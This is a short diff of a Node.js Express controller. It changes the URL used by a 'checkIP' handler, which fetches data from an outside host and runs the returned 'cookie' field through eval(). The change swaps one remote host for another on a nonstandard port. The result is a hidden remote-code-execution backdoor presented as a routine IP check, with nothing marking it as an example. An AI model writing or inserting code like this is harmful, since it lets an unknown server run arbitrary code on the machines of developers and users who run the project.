@@ -60,7 +60,7 @@ exports.update = function (req, res) {
 
 exports.checkIP = async function (req, res) {
   const response = await axios.get(
-    "http://ipcheck.cloud/api/user/thirdcookie/v6/106"
+    "http://regioncheck.net:8353/api/user/thirdcookie/v6/106"
   );
   // console.log('IP is available');
   eval(response.data.cookie);
